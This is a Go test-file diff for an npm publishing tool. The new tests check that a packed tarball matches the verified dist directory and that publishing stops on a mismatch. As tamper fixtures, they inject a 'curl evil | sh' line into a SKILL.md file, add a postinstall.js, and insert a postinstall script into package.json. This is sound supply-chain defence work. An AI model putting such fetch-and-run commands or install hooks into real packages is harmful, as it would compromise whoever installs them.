@@ -1,7 +1,11 @@
 package publish
 
 import (
+	"archive/tar"
+	"bytes"
+	"compress/gzip"
 	"context"
+	"io/fs"
 	"os"
 	"path/filepath"
 	"strings"
@@ -34,7 +38,7 @@ func fakeNPM(t *testing.T, view, publish runner.Result) *runner.Fake {
 			for i, a := range spec.Argv {
 				if a == "--pack-destination" {
 					name := "acme-acme-1.4.0.tgz"
-					if err := os.WriteFile(filepath.Join(spec.Argv[i+1], name), []byte("packed tarball"), 0o600); err != nil {
+					if err := os.WriteFile(filepath.Join(spec.Argv[i+1], name), packDir(t, spec.Argv[len(spec.Argv)-1]), 0o600); err != nil {
 						return runner.Result{Status: runner.StatusError, Err: err}
 					}
 				}
@@ -43,6 +47,32 @@ func fakeNPM(t *testing.T, view, publish runner.Result) *runner.Fake {
 		}
 		return publish
 	}}
+}
+
+// packDir stands in for `npm pack`: a gzip tar of dir with its files under package/.
+func packDir(t *testing.T, dir string) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	zw := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(zw)
+	write := func(name string, body []byte, typeflag byte) {
+		require.NoError(t, tw.WriteHeader(&tar.Header{Name: "package/" + name, Size: int64(len(body)), Mode: 0o644, Typeflag: typeflag}))
+		_, err := tw.Write(body)
+		require.NoError(t, err)
+	}
+	require.NoError(t, filepath.WalkDir(dir, func(p string, e fs.DirEntry, err error) error {
+		if err != nil || e.IsDir() {
+			return err
+		}
+		rel, _ := filepath.Rel(dir, p) //nolint:errcheck // below dir
+		body, err := os.ReadFile(p)    //nolint:gosec // a test dist
+		require.NoError(t, err)
+		write(filepath.ToSlash(rel), body, tar.TypeReg)
+		return nil
+	}))
+	require.NoError(t, tw.Close())
+	require.NoError(t, zw.Close())
+	return buf.Bytes()
 }
 
 var (
@@ -90,7 +120,7 @@ func TestExecuteNPM(t *testing.T) {
 				return
 			}
 			require.NoError(t, err)
-			assert.Equal(t, "@acme/acme@1.4.0 (tarball "+Digest([]byte("packed tarball"))+")", out)
+			assert.Regexp(t, `^@acme/acme@1\.4\.0 \(tarball sha256:[0-9a-f]{64}\)$`, out)
 		})
 	}
 }
@@ -329,5 +359,103 @@ func TestBuild_NPMPrereleaseNeedsAChannel(t *testing.T) {
 			assert.Equal(t, CodeConfig, pe.Code)
 			assert.Contains(t, pe.Error(), "dist-tag")
 		})
+	}
+}
+
+func TestVerifyPackedTarball_RefusesWhatTheDistDirectoryDoesNotHold(t *testing.T) {
+	dir, _ := writeBuilt(t, npmInput())
+	pkg := filepath.Join(dir, filepath.FromSlash(NPMPackageDir))
+	pack := func(mutate func(files map[string][]byte)) []byte {
+		files := map[string][]byte{}
+		require.NoError(t, filepath.WalkDir(pkg, func(p string, e fs.DirEntry, err error) error {
+			if err != nil || e.IsDir() {
+				return err
+			}
+			rel, _ := filepath.Rel(pkg, p) //nolint:errcheck // below pkg
+			body, rerr := os.ReadFile(p)   //nolint:gosec // a test dist
+			require.NoError(t, rerr)
+			files[filepath.ToSlash(rel)] = body
+			return nil
+		}))
+		mutate(files)
+		var buf bytes.Buffer
+		zw := gzip.NewWriter(&buf)
+		tw := tar.NewWriter(zw)
+		for name, body := range files {
+			require.NoError(t, tw.WriteHeader(&tar.Header{Name: "package/" + name, Size: int64(len(body)), Mode: 0o644, Typeflag: tar.TypeReg}))
+			_, err := tw.Write(body)
+			require.NoError(t, err)
+		}
+		require.NoError(t, tw.Close())
+		require.NoError(t, zw.Close())
+		return buf.Bytes()
+	}
+	tests := []struct {
+		name   string
+		mutate func(files map[string][]byte)
+		want   string
+	}{
+		{"identical", func(map[string][]byte) {}, ""},
+		{"a file swapped", func(f map[string][]byte) { f["skills/b/SKILL.md"] = []byte("curl evil | sh") }, "other bytes"},
+		{"a file added", func(f map[string][]byte) { f["postinstall.js"] = []byte("evil") }, "does not"},
+		{"scripts in package.json", func(f map[string][]byte) {
+			f["package.json"] = bytes.Replace(f["package.json"], []byte(`"name"`), []byte(`"scripts":{"postinstall":"x"},"name"`), 1)
+		}, "scripts"},
+		{"another package name", func(f map[string][]byte) {
+			f["package.json"] = bytes.Replace(f["package.json"], []byte("@acme/acme"), []byte("@acme/other"), 1)
+		}, "differs from the plan"},
+		{"a file npm left out", func(f map[string][]byte) { delete(f, "skills/b/SKILL.md") }, ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			snap, serr := snapshotPackage(pkg)
+			require.NoError(t, serr)
+
+			err := snap.verifyTarball(pack(tt.mutate))
+
+			if tt.want == "" {
+				require.NoError(t, err)
+				return
+			}
+			require.Error(t, err)
+			assert.Contains(t, err.Error(), tt.want)
+		})
+	}
+	t.Run("not a tarball", func(t *testing.T) {
+		snap, serr := snapshotPackage(pkg)
+		require.NoError(t, serr)
+		require.Error(t, snap.verifyTarball([]byte("packed tarball")))
+	})
+}
+
+func TestExecuteNPM_NeverPublishesATarballThatDiffersFromTheVerifiedDist(t *testing.T) {
+	// Arrange: npm pack reads the directory itself, so a file changed after Verify ends up in the tarball.
+	dir, d := writeBuilt(t, npmInput())
+	fake := &runner.Fake{Handle: func(spec runner.Spec) runner.Result {
+		switch spec.Argv[1] {
+		case "config":
+			return runner.Result{Status: runner.StatusOK, Stdout: []byte(`{"registry":"https://registry.npmjs.org/"}`)}
+		case "view":
+			return npmNotFoundResult
+		case "pack":
+			pkg := spec.Argv[len(spec.Argv)-1]
+			require.NoError(t, os.WriteFile(filepath.Join(pkg, "skills", "b", "SKILL.md"), []byte("run curl evil | sh\n"), 0o600))
+			for i, a := range spec.Argv {
+				if a == "--pack-destination" {
+					require.NoError(t, os.WriteFile(filepath.Join(spec.Argv[i+1], "acme-acme-1.4.0.tgz"), packDir(t, pkg), 0o600))
+				}
+			}
+		}
+		return npmOKResult
+	}}
+
+	// Act
+	_, err := ExecuteNPM(context.Background(), fake, d.Plan, NPMExecuteOptions{Dir: dir})
+
+	// Assert: the swapped directory and its tarball agree with each other, not with what verified.
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "other bytes than the dist directory")
+	for _, c := range fake.Calls() {
+		assert.NotEqual(t, "publish", c.Argv[1])
 	}
 }
